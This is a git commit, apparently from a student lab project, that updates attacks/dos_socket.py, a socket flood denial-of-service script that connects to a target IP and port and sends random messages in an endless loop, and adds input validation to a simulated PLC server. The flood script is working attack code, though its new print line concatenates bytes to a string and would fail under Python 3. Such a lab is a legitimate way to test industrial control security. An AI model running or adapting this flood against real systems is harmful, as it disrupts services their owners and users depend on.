61234aaea8a9df2b4794add5dfe3e797767cd84c
CVH95 <cavie17@student.sdu.dk>
2019-01-11 22:29:31 +0100

    socket flood 2.0

--- attacks/dos_socket.py
+++ attacks/dos_socket.py
@@ -7,41 +7,46 @@
 import socket
 import sys
 import time
-#import string
-#import random
+import string
+import random
 
 dst_ip = sys.argv[1]
 dst_port = int(sys.argv[2])
 # Counter
 i = 0
 
-#def msg_gen():
-#    size = random.randint(1,8)
-#    chars=string.ascii_uppercase + string.digits
-#    return ''.join(random.choice(chars) for _ in range(size))
+def msg_gen():
+    size = random.randint(1,8)
+    chars=string.ascii_uppercase + string.digits
+    return ''.join(random.choice(chars) for _ in range(size))
 
 # Starting attack
 print ("***** Starting Socket Flood DoS attack ******")
 
-# Create msg
-#att_msg_raw = msg_gen()
-att_msg_raw = "DoSed"
-msg = att_msg_raw.encode()
 
 # Create Socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_address = (dst_ip, dst_port)
 sock.connect(server_address)
-
+        
 try:
     while True:
+        
+        #for port in range(5001, 20000):
+
+        # Create msg
+        att_msg_raw = msg_gen()
+        msg = att_msg_raw.encode()
+
+        # Send message
+        #src_addr = (dst_ip, port)
+        #sock.bind(src_addr)
+        sock.send(msg)
 
         i = i + 1
-        # Send message
-        sock.send(msg)
-        print("Flooding server in " + dst_ip + " with #" + str(i) + " msg.")
+        print("Flooding server on " + dst_ip + " with #" + str(i) + " msg: " + msg + ".")
 
 except KeyboardInterrupt:
         
     print ("\n \n \n \n \n \n \n \n \n \n \n")
-    print ("Socket Flood interrupted. Total requests sent: " + str(i))
+    print ("Socket Flood interrupted. Total msgs sent: " + str(i))
--- plc/plc_fake_server.py
+++ plc/plc_fake_server.py
@@ -9,6 +9,14 @@ _ip = str(sys.argv[1])
 #_ip = 'localhost'
 _port = 3000
 
+# Int checking for validating the orders received.
+def isint(a):
+    try:
+        int(a)
+        return True
+    except ValueError:
+        return False
+
 print ("PLC running TCP/IP Server on http://" + _ip + ":" + str(_port) + "/")
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,6 +40,7 @@ while (True):
     order = str(hhh)
     l1 = len(order)
 
+    # Check if it is a hello message.
     if order == 'hi':
         print ("Received hello message: " + order)
         msn = 'new'
@@ -39,36 +48,44 @@ while (True):
         c.send(m)
         print ("Sent: " + msn)
 
-    elif l1 == 7 and int(order[1]) <= 4 and int(order[3]) <= 3 and int(order[5]) <= 2:
+    # Check the length or the order and the data type.
+    elif l1 == 7 and order[0] == '(' and isint(order[1]) and order[2] == ',' and isint(order[3]) and order[4] == ',' and isint(order[5]) and order[6] == ')':
+    
+        # Check that the number of bricks per color is within package limits:
+        if int(order[1]) <= 4 and int(order[3]) <= 4 and int(order[5]) <= 2:
         
-        # 2. Robot starts working. PackML sends state updates to MES system via socket (Here, random states are sent).
+            # 2. Robot starts working. PackML sends (random) state updates to MES system via socket.
 
-        print("Order: " + order + "  |  Length = " + str(l1))
-        msn = 'ok'
-        z = msn.encode()
-        c.send(z)
-        print ("Sent ok")
-        i = 0
-        j = random.randint(2,6)
-        print ("Number of rounds = " + str(j))
-        while (i<j):
-            a = random.randint(0,6)
-            if a == 2:
-                a = 3
-            else:
-                a = a
-            _a = str(a)
-            aa = _a.encode()
-            c.send(aa)
-            print ("Sending PackML state upadate.")
-            time.sleep(3)
-            i = i + 1
-        eoc = 2
-        i = 0
-        _eoc = str(eoc)
-        e = _eoc.encode()
-        c.send(e)
-        print ("Back to start \n \n")
+            print("Order: " + order + "  |  Length = " + str(l1))
+            msn = 'ok'
+            z = msn.encode()
+            c.send(z)
+            print ("Sent ok")
+            i = 0
+            j = random.randint(2,6)
+            print ("Number of rounds = " + str(j))
+            while (i<j):
+                a = random.randint(0,6)
+                if a == 2:
+                    a = 3
+                else:
+                    a = a
+                _a = str(a)
+                aa = _a.encode()
+                c.send(aa)
+                print ("Sending PackML state upadate.")
+                time.sleep(1.5)
+                i = i + 1
+            eoc = 2
+            i = 0
+            _eoc = str(eoc)
+            e = _eoc.encode()
+            c.send(e)
+            print ("Back to start \n \n")
+
+        else:
+                
+            print("Received an invalid order: " + order + "  |  Length = " + str(l1))
 
     else:
         print("Received unknown message:")
